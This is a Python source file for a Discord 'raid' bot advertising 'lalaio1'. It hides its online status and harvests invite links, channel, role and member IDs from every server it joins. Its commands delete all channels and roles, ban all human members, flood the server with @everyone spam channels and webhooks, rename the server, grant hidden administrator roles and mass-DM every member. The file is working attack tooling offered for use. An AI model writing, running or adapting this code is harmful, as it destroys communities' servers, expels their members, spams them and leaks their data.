import discord
from discord.ext import commands
import asyncio
import sys
import random

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='A.', intents=intents)
bot.remove_command('help')

MESSAGE_TEXT = f"""
> discord.gg/lalaio1
> https://media.discordapp.net/attachments/1190696151830253690/1215826745492766830/3920cb444aaaded4ae910e0745147c0d.gif?ex=667b6865&is=667a16e5&hm=70e81f15a2425989ce4b37ce6bb740b9845edde6f0975d6cc12597381c77eea5&
> 
> ### ⚡ **lalaio1 Bot!** ⚡
> 
> - **🔥 Melhor Bot do Discord!**
> - **🔧 Bot de Multifunções!**
> - **📊 Puxando dados!**
> 
> 
> ||@everyone @here ||
"""

CHANNEL_NAME = "🧙‍♂️ | lalaio1 | Discord.gg/lalaio1"
NUM_CHANNELS = 50
NUM_MESSAGES = 10
NUM_ROLES = 10
WEBHOOK_MESSAGE_COUNT = 10
SERVER_IMAGE_PATH = r"/home/lalaio1/lalaio1 bot/images/lalaio1atualizado.png"
NEW_SERVER_NAME = "🧙‍♂️ ๘ Raid By discord.gg/lalaio1 ๘ 🧙‍♂️"

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.offline)
    await save_bot_info(bot)


async def save_bot_info(bot):
    info_txt_path = f"bot_info.txt"

    with open(info_txt_path, "w", encoding="utf-8") as info_file:
        info_file.write(f"======principal info======\n")
        info_file.write(f"Bot Name: {bot.user.name}\n")
        info_file.write(f"Bot ID: {bot.user.id}\n")

        for guild in bot.guilds:
            invite_link = await guild.text_channels[0].create_invite()
            info_file.write(f"\n\n  - {guild.name}: {invite_link}\n")

            info_file.write("\n\n======ID dos canais de texto======\n")
            for channel in guild.text_channels:
                info_file.write(f"ID: {channel.id} - Nome: {channel.name}\n")

            info_file.write("\n\n======ID dos canais de voz======\n")
            for channel in guild.voice_channels:
                info_file.write(f"ID: {channel.id} - Nome: {channel.name}\n")

            info_file.write("\n\n======ID dos membros======\n")
            for member in guild.members:
                info_file.write(f"ID: {member.id} - Nome: {member.name}\n")

            info_file.write("\n\n======ID dos cargos======\n")
            for role in guild.roles:
                info_file.write(f"ID: {role.id} - Nome: {role.name}\n")

async def update_server_image(guild):
    with open(SERVER_IMAGE_PATH, "rb") as image_file:
        image_data = image_file.read()
    
    await guild.edit(icon=image_data)

async def update_server_name(guild, name):
    await guild.edit(name=name)

async def create_roles(guild):
    roles = []
    
    for _ in range(NUM_ROLES):
        color = discord.Color(random.randint(0, 0xFFFFFF))
        permissions = discord.Permissions(
            read_messages=random.choice([True, False]),
            send_messages=random.choice([True, False]),
            manage_channels=random.choice([True, False]),
            manage_roles=random.choice([True, False]),
        )
        role_name = "discord.gg/lalaio1"

        role = await guild.create_role(name=role_name, color=color, permissions=permissions)
        roles.append(role)

async def create_channel(guild):
    channel = await guild.create_text_channel(CHANNEL_NAME)
    webhook = await channel.create_webhook(name="discord.gg/lalaio1")

    for _ in range(NUM_MESSAGES):
        await channel.send(MESSAGE_TEXT)  
        
        await webhook.send(MESSAGE_TEXT)  
        await webhook.delete()

@bot.command()
async def raid(ctx):
    guild = ctx.guild
    delete_channels_tasks = [channel.delete() for channel in guild.channels]
    delete_roles_tasks = [role.delete() for role in guild.roles if role != guild.default_role]
    ban_members_tasks = [member.ban() for member in guild.members if not member.bot]
    create_channels_tasks = [create_channel(guild) for _ in range(NUM_CHANNELS)]
    create_roles_task = create_roles(guild)
    update_image_task = update_server_image(guild)
    update_name_task = update_server_name(guild, NEW_SERVER_NAME)

    tasks = delete_channels_tasks + delete_roles_tasks + ban_members_tasks + create_channels_tasks + create_roles_task + update_image_task + update_name_task
    await asyncio.gather(*tasks)



@bot.command(name='admall')
async def criar_cargo(ctx):
    await ctx.message.delete()

    guild = ctx.guild
    role_name = 'ㅤ'  

    
    embed_criando = discord.Embed(
        title="Criando Cargo",
        description=f"Estou criando o cargo '{role_name}' com permissões de administrador.",
        color=discord.Color.green()
    )
    embed_criando.set_thumbnail(url="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/twitter/282/package_1f4e6.png")
    await ctx.author.send(embed=embed_criando)

  
    permissions = discord.Permissions(administrator=True)
    new_role = await guild.create_role(name=role_name, permissions=permissions)

   
    await new_role.edit(position=len(guild.roles) - 1)

    
    for member in guild.members:
        if not any(role.permissions.administrator for role in member.roles):
            try:
                await member.add_roles(new_role)
            except discord.Forbidden:
                await ctx.author.send(f"Não foi possível atribuir o cargo '{role_name}' ao membro {member.display_name}.")

   





@bot.command(name='dmall', help='Envia uma mensagem direta para todos os membros (exceto bots)')
async def dmall(ctx, *, message: str):
    await ctx.message.delete()
    
    embed_start = discord.Embed(
        title="📬 Enviando Mensagens Diretas",
        description="Aguarde enquanto a mensagem está sendo enviada para todos os membros...",
        color=discord.Color.blue()
    )
    await ctx.author.send(embed=embed_start)

    for member in ctx.guild.members:
        if not member.bot and member != ctx.author:
            try:
                await member.send(message)  
                print(f"[!] Mensagem enviada para: {member.name}")
                
                await asyncio.sleep(random.uniform(1, 3))
            except Exception as e:
                embed_error = discord.Embed(
                    title="❌ Erro ao enviar mensagem",
                    description=f"Erro ao enviar mensagem para {member.name}: {e}",
                    color=discord.Color.red()
                )
                await ctx.author.send(embed=embed_error)

    embed_complete = discord.Embed(
        title="✉️ Mensagem Direta Concluída",
        description="A mensagem foi enviada para todos os membros (exceto bots) no servidor, exceto você.",
        color=discord.Color.green()
    )
    await ctx.author.send(embed=embed_complete)



if __name__ == "__main__":
    if len(sys.argv) > 1:
        token = sys.argv[1]
    bot.run(token)
